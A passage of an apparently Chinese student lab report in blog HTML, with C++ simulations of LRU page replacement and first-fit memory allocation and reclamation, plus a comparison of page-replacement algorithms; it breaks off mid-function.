class="hljs-number">-1</span>;<br><br>        <span class="hljs-comment">//将key移到第一个，并更新cacheMap</span><br>        cacheMap[key] = cacheList.<span class="hljs-built_in">begin</span>();<br>        cacheList.<span class="hljs-built_in">splice</span>(cacheList.<span class="hljs-built_in">begin</span>(), cacheList, cacheMap[key]);<br>        <span class="hljs-keyword">return</span> cacheMap[key]-&gt;value;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> val)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (cacheMap.<span class="hljs-built_in">find</span>(key) == cacheMap.<span class="hljs-built_in">end</span>())<br>        &#123;<br>            missing = <span class="hljs-number">1</span>; <span class="hljs-comment">//表示缺页</span><br>            <span class="hljs-comment">//淘汰最后一个，然后将其加到第一个位置</span><br>            <span class="hljs-keyword">if</span> (cacheList.<span class="hljs-built_in">size</span>() == capacity)<br>            &#123;<br>                cacheMap.<span class="hljs-built_in">erase</span>(cacheList.<span class="hljs-built_in">back</span>().key);<br>                cacheList.<span class="hljs-built_in">pop_back</span>();<br>            &#125;<br>            cacheList.<span class="hljs-built_in">push_front</span>(<span class="hljs-built_in">Node</span>(key, val));<br>            cacheMap[key] = cacheList.<span class="hljs-built_in">begin</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            missing = <span class="hljs-number">0</span>; <span class="hljs-comment">//表示未缺页</span><br>            <span class="hljs-comment">//更新节点的值，并将其加到第一个位置,map和list均要更新</span><br>            cacheMap[key]-&gt;value = val;<br>            cacheList.<span class="hljs-built_in">splice</span>(cacheList.<span class="hljs-built_in">begin</span>(), cacheList, cacheMap[key]);<br>            cacheMap[key] = cacheList.<span class="hljs-built_in">begin</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = cacheList.<span class="hljs-built_in">rbegin</span>(); i != cacheList.<span class="hljs-built_in">rend</span>(); i++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2d&quot;</span>, i-&gt;key);<br>            t++;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (t++ &lt; <span class="hljs-number">3</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2c&quot;</span>, <span class="hljs-string">&#x27; &#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> missing;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-keyword">int</span> key;<br>        <span class="hljs-keyword">int</span> value;<br>        <span class="hljs-built_in">Node</span>(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y) : <span class="hljs-built_in">key</span>(x), <span class="hljs-built_in">value</span>(y) &#123;&#125;<br>    &#125;;<br>    <span class="hljs-keyword">int</span> capacity;<span class="hljs-comment">//内存页面容量</span><br>    <span class="hljs-keyword">int</span> missing = <span class="hljs-number">0</span>;<span class="hljs-comment">//是否缺页</span><br>    list&lt;Node&gt; cacheList;                              <span class="hljs-comment">//双向链表</span><br>    unordered_map&lt;<span class="hljs-keyword">int</span>, list&lt;Node&gt;::iterator&gt; cacheMap; <span class="hljs-comment">//哈希表</span><br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>((<span class="hljs-keyword">int</span>)<span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>));<br>    <span class="hljs-function">LRUCache <span class="hljs-title">lru</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span>; <span class="hljs-comment">//背包容量初始化</span><br>    <span class="hljs-built_in">buildpage</span>();     <span class="hljs-comment">//页面初始化</span><br>    <span class="hljs-keyword">double</span> m = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|---------------LRU--------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| 页面序列 | 当前页块 | 是否缺页 |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++)<br>    &#123;<br>        lru.<span class="hljs-built_in">set</span>(pagelist[i], pagelist[i]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|    %d     |  &quot;</span>, pagelist[i]);<br>        <span class="hljs-keyword">if</span> (lru.<span class="hljs-built_in">show</span>())<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  |   缺页   |\n&quot;</span>), m++;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  |          |\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;缺页次数为：%.0f\n缺页率为: %.2f%%&quot;</span>, m, m / <span class="hljs-number">20</span> * <span class="hljs-number">100</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果"><a class="markdownIt-Anchor" href="#程序初值和运行结果"></a> 程序初值和运行结果</h4><p>初值</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">1</span> <span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">2</span> <span class="hljs-number">7</span> <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><p>测试样例结果：</p><p><img src="/posts/6c024da0/image-20211212155603938.png" alt="image-20211212155603938"></p><p>页面序列随机生成结果：</p><p><img src="/posts/6c024da0/image-20211212155623913.png" alt="image-20211212155623913"></p><p><img src="/posts/6c024da0/image-20211212155651385.png" alt="image-20211212155651385"></p><h4 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h4><p><strong>页面置换算法各自的优缺点</strong></p><ul><li><p>LRU（最近最久未使用）：</p><ul><li>优点：由于考虑程序访问的时间局部性，一般能有较好的性能；实际应用多</li><li>缺点：实现需要较多的硬件支持，会增加硬件成本</li></ul></li><li><p>FIFO（先进先出）：</p><ul><li>优点：先进先出算法实现简单，是最直观的一个算法</li><li>缺点：先进先出的性能最差，因为与通常页面的使用规则不符合，所以实际应用少</li></ul></li><li><p>OPT（最佳置换）：</p><ul><li><p>缺点：最佳置换算法是一种理想化算法，具有较好的性能，但是实际上无法实现（无法预知一个进程中的若干页面哪一个最长时间不被访问）；</p></li><li><p>优点：最佳置换算法可以保证获得最低的缺页率</p></li></ul></li></ul><h3 id="五-实验总结"><a class="markdownIt-Anchor" href="#五-实验总结"></a> 五、实验总结</h3><p>LRU算法本身比较简单，关键在于时间复杂度的控制，使其能够高效实现，哈希表可以在O(1)时间内查找，双向链表可以在O(1)时间内插入和删除，所以两者结合可以高效的实现LRU，本次实验过程是我重新回顾了list和map的用法，结合这两者，成功完成了实验。</p><h1 id="实验2主存储器空间的分配和回收"><a class="markdownIt-Anchor" href="#实验2主存储器空间的分配和回收"></a> 实验2：主存储器空间的分配和回收</h1><h2 id="一-实验内容-2"><a class="markdownIt-Anchor" href="#一-实验内容-2"></a> 一、实验内容</h2><ul><li>主存储器空间的分配和回收</li></ul><h2 id="二-实验目的-2"><a class="markdownIt-Anchor" href="#二-实验目的-2"></a> 二、实验目的</h2><ul><li>通过本实验帮助学生理解在不同的存储管理方式下应怎样实现主存空间的分配和回收</li></ul><h2 id="三-实验题目-2"><a class="markdownIt-Anchor" href="#三-实验题目-2"></a> 三、实验题目</h2><p>本实验模拟在两种存储管理方式下的主存分配和回收。</p><h3 id="第一题"><a class="markdownIt-Anchor" href="#第一题"></a> 第一题：</h3><p>在可变分区管理方式下采用<strong>最先适应算法</strong>实现主存分配和实现主存回收。</p><p>[提示]：</p><ol><li><p>可变分区方式是按作业需要的主存空间大小来分割分区的。当要装入一个作业时，根据作业需要的主存量查看是否有足够的空闲空间，若有，则按需要量分割一个分区分配给该作业；若无，则作业不能装入。随着作业的装入、撤离，主存空间被分成许多个分区，有的分区被作业占用，而有的分区是空闲的。例如：</p><p><img src="/posts/6c024da0/image-20211213172512213.png" alt="image-20211213172512213"></p><p>为了说明哪些区是空闲的，可以用来装入新作业，必须要有一张空闲区说明表，格式如下：</p><p><img src="/posts/6c024da0/image-20211213172536343.png" alt="image-20211213172536343"></p></li><li><p>当有一个新作业要求装入主存时，必须查空闲区说明表，从中找出一个足够大的空闲区。有时找到的空闲区可能大于作业需要量，这时应把原来的空闲区变成两部分：一部分分给作业占用；另一部分又成为一个较小的空闲区。为了尽量减少由于分割造成的空闲区，而尽量保存高地址部分有较大的连续空闲区域，以利于大型作业的装入。为此，在空闲区说明表中，把每个空闲区按其地址顺序登记，即每个后继的空闲区其起始地址总是比前者大。为了方便查找还可使表格“紧缩”，总是让“空表目”栏集中在表格的后部。</p></li><li><p>采用最先适应算法（顺序分配算法）分配主存空间。按照作业的需要量，查空闲区说明表，顺序查看登记栏，找到第一个能满足要求的空闲区。当空闲区大于需要量时，一部分用来装入作业，另一部分仍为空闲区登记在空闲区说明表中。由于本实验是模拟主存的分配，所以把主存区分配给作业后并不实际启动装入程序装入作业，而用输出“分配情况”来代替。最先适应分配算法如图。</p><p><img src="/posts/6c024da0/image-20211213172909092.png" alt="image-20211213172909092"></p></li><li><p>当一个作业执行结束撤离时，作业所占的区域应该归还，归还的区域如果与其它空闲区相邻，则应合成一个较大的空闲区，登记在空闲区说明表中。例如，在提示(1)中列举的情况下，如果作业2撤离，归还所占主存区域时，应与上、下相邻的空闲区一起合成一个大的空闲区登记在空闲区说明表中。归还主存时的回收算法如图。</p><p><img src="/posts/6c024da0/image-20211213172948727.png" alt="image-20211213172948727"></p></li><li><p>请按最先适应算法设计主存分配和回收的程序。然后按（1）中假设主存中已装入三个作业，且形成两个空闲区，确定空闲区说明表的初值。现有一个需要主存量为6K的作业4申请装入主存；然后作业3撤离；再作业2撤离。请你为它们进行主存分配和回收，把空闲区说明表的初值以及每次分配或回收后的变化显示出来或打印出来。</p></li></ol><h3 id="第二题"><a class="markdownIt-Anchor" href="#第二题"></a> 第二题：</h3><p><strong>在分页式管理方式下采用位示图来表示主存分配情况，实现主存空间的分配和回收。</strong></p><p>[提示]：</p><ol><li><p>分页式存储器把主存分成大小相等的若干块，作业的信息也按块的大小分页，作业装入主存时可把作业的信息按页分散存放在主存的空闲块中，为了说明主存中哪些块已经被占用，哪些块是尚未分配的空闲块，可用一张位示图来指出。位示图可由若干存储单元来构成，其中每一位与一个物理块对应，用0/1表示对应块为空闲/已占用。</p></li><li><p>假设某系统的主存被分成大小相等的64块，则位示图可用8个字节来构成，另用一单元记录当前空闲块数。如果已有第0，1，4，5，6，9，11，13，24，31，共10个主存块被占用了，那么位示图情况如下</p><p><img src="/posts/6c024da0/image-20211213173805545.png" alt="image-20211213173805545"></p></li><li><p>当要装入一个作业时，根据作业对主存的需要量，先查当前空闲块数是否能满足作业要求，若不能满足则输出分配不成功。若能满足，则查位示图，找出为“0”的一些位，置上占用标志“1”，从“当前空闲块数”中减去本次占用块数。按找到的计算出对应的块号，其计算公式为：块号=j 8+I其中，j表示找到的是第n个字节，i表示对应的是第n位。根据分配给作业的块号，为作业建立一张页表，页表<br>格式：</p><p><img src="/posts/6c024da0/image-20211213173822803.png" alt="image-20211213173822803"></p></li><li><p>当一个作业执行结束，归还主存时，根据该作业的页表可以知道应归还的块号，由块号可计算出在位示图中的对应位置，把对应位的占用标志清成“0”，表示对应的块已成为空闲块。归还的块数加入到当前空闲块数中。由块号计算在位示图中的位置的公式如下：字节号 j=[块号/8] （[ ]表示取整）位数 i={块号/8} （{ }表示取余）</p></li><li><p>设计实现主存分配和回收的程序。假定位示图的初始状态如（2）所述，现有一信息量为5页的作业要装入，运行你所设计的分配程序，为作业分配主存且建立页表（格式如（3）所述）。然后假定有另一作业执行结束，它占用的块号为第4，5，6和31块，运行你所设计的回收程序，收回作业归还的主存块。要求能显示和打印分配或回收前后的位示图和当前空闲<br>块数，对完成一次分配后还要显示或打印为作业建立的页表</p></li></ol><h3 id="思考题-2"><a class="markdownIt-Anchor" href="#思考题-2"></a> 思考题：</h3><p>结合实际情况，参考书本，仔细考虑各种主存分配算法的优缺点。把主存分成大小相等的若干块，作业的信息也按块的大小分页，作业装入主存时把作业的信息按页分散存放在主存的空闲块中，这样很可能导致每个作业按页装入主存中时，某一页还存在一定的空闲空间，思考如何才能有效的利用这些空闲区域。</p><h2 id="四-实验设计与过程-2"><a class="markdownIt-Anchor" href="#四-实验设计与过程-2"></a> 四、实验设计与过程</h2><h3 id="第一题最先适应"><a class="markdownIt-Anchor" href="#第一题最先适应"></a> 第一题：最先适应</h3><h4 id="数据结构和符号说明-2"><a class="markdownIt-Anchor" href="#数据结构和符号说明-2"></a> 数据结构和符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">table</span></span><br><span class="hljs-class">&#123;</span><br>    string name; <span class="hljs-comment">//主存分配信息</span><br>    <span class="hljs-keyword">int</span> address; <span class="hljs-comment">//主存起始地址</span><br>    <span class="hljs-keyword">int</span> length;  <span class="hljs-comment">//主存分配长度</span><br>    <span class="hljs-keyword">int</span> state;   <span class="hljs-comment">//主存状态信息，1为已分配，0为未分配</span><br>&#125;;<br>vector&lt;table&gt; alloc_table;   <span class="hljs-comment">//主存表</span><br></code></pre></div></td></tr></table></figure><h4 id="函数说明-2"><a class="markdownIt-Anchor" href="#函数说明-2"></a> 函数说明</h4><p>一共三个主要函数</p><ul><li>未分配主存的合并函数</li><li>主存回收函数</li><li>主存分配函数</li></ul><p>根据流程图，函数思路均很清晰。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">merge</span><span class="hljs-params">()</span> <span class="hljs-comment">//未分配主存的合并函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (alloc_table[i].address + alloc_table[i].length == alloc_table[i + <span class="hljs-number">1</span>].address &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span> &amp;&amp; alloc_table[i + <span class="hljs-number">1</span>].state == <span class="hljs-number">0</span>)<br>        &#123; <span class="hljs-comment">//相邻则合并，并删掉后者</span><br>            alloc_table[i].length += alloc_table[i + <span class="hljs-number">1</span>].length;<br>            alloc_table.<span class="hljs-built_in">erase</span>(alloc_table.<span class="hljs-built_in">begin</span>() + i + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">recovery</span><span class="hljs-params">(string name)</span> <span class="hljs-comment">//主存回收函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (alloc_table[i].name == name)<br>        &#123;<br>            alloc_table[i].name = <span class="hljs-string">&quot;未分配&quot;</span>;<br>            alloc_table[i].state = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">return</span> alloc_table[i].length;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">allocation</span><span class="hljs-params">(string name, <span class="hljs-keyword">int</span> length)</span> <span class="hljs-comment">//主存分配函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (alloc_table[i].length &gt; length &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span>) <span class="hljs-comment">//剩余空间比需求大</span><br>        &#123;<br>            table t;<br>            t.name = name;<br>            t.address = alloc_table[i].address;<br>            t.length = length;<br>            t.state = <span class="hljs-number">1</span>;<br>            alloc_table.<span class="hljs-built_in">push_back</span>(t);<br><br>            alloc_table[i].address += length;<br>            alloc_table[i].length -= length;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (alloc_table[i].length == length &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span>) <span class="hljs-comment">//剩余空间和需求一样</span><br>        &#123;<br>            alloc_table[i].name = name;<br>            alloc_table[i].state = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="完整源代码-2"><a class="markdownIt-Anchor" href="#完整源代码-2"></a> 完整源代码</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">table</span></span><br><span class="hljs-class">&#123;</span><br>    string name; <span class="hljs-comment">//主存分配信息</span><br>    <span class="hljs-keyword">int</span> address; <span class="hljs-comment">//主存起始地址</span><br>    <span class="hljs-keyword">int</span> length;  <span class="hljs-comment">//主存分配长度</span><br>    <span class="hljs-keyword">int</span> state;   <span class="hljs-comment">//主存状态信息，1为已分配，0位未分配</span><br>&#125;;<br>vector&lt;table&gt; alloc_table;   <span class="hljs-comment">//主存表</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(table &amp;a, table &amp;b)</span> <span class="hljs-comment">//排序比较函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a.address &lt; b.address;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">merge</span><span class="hljs-params">()</span> <span class="hljs-comment">//未分配主存的合并函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (alloc_table[i].address + alloc_table[i].length == alloc_table[i + <span class="hljs-number">1</span>].address &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span> &amp;&amp; alloc_table[i + <span class="hljs-number">1</span>].state == <span class="hljs-number">0</span>)<br>        &#123; <span class="hljs-comment">//相邻则合并，并删掉后者</span><br>            alloc_table[i].length += alloc_table[i + <span class="hljs-number">1</span>].length;<br>            alloc_table.<span class="hljs-built_in">erase</span>(alloc_table.<span class="hljs-built_in">begin</span>() + i + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">recovery</span><span class="hljs-params">(string name)</span> <span class="hljs-comment">//主存回收函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (alloc_table[i].name == name)<br>        &#123;<br>            alloc_table[i].name = <span class="hljs-string">&quot;未分配&quot;</span>;<br>            alloc_table[i].state = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">return</span> alloc_table[i].length;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">allocation</span><span class="hljs-params">(string name, <span class="hljs-keyword">int</span> length)</span> <span class="hljs-comment">//主存分配函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (alloc_table[i].length &gt; length &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span>) <span class="hljs-comment">//剩余空间比需求大</span><br>        &#123;<br>            table t;<br>            t.name = name;<br>            t.address = alloc_table[i].address;<br>            t.length = length;<br>            t.state = <span class="hljs-number">1</span>;<br>            alloc_table.<span class="hljs-built_in">push_back</span>(t);<br><br>            alloc_table[i].address += length;<br>            alloc_table[i].length -= length;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (alloc_table[i].length == length &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span>) <span class="hljs-comment">//剩余空间和需求一样</span><br>        &#123;<br>            alloc_table[i].name = name;<br>            alloc_table[i].state = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-comment">//状态初始化</span></span><br><span class="hljs-function"></span>&#123;<br>    table a;<br>    a.name = <span class="hljs-string">&quot;操作系统&quot;</span>;<br>    a.address = <span class="hljs-number">0</span>;<br>    a.length = <span class="hljs-number">5</span>;<br>    a.state = <span class="hljs-number">1</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;1&quot;</span>;<br>    a.address = <span class="hljs-number">5</span>;<br>    a.length = <span class="hljs-number">5</span>;<br>    a.state = <span class="hljs-number">1</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;3&quot;</span>;<br>    a.address = <span class="hljs-number">10</span>;<br>    a.length = <span class="hljs-number">4</span>;<br>    a.state = <span class="hljs-number">1</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;2&quot;</span>;<br>    a.address = <span class="hljs-number">26</span>;<br>    a.length = <span class="hljs-number">6</span>;<br>    a.state = <span class="hljs-number">1</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;未分配&quot;</span>;<br>    a.address = <span class="hljs-number">14</span>;<br>    a.length = <span class="hljs-number">12</span>;<br>    a.state = <span class="hljs-number">0</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;未分配&quot;</span>;<br>    a.address = <span class="hljs-number">32</span>;<br>    a.length = <span class="hljs-number">96</span>;<br>    a.state = <span class="hljs-number">0</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> <span class="hljs-comment">//信息打印</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span 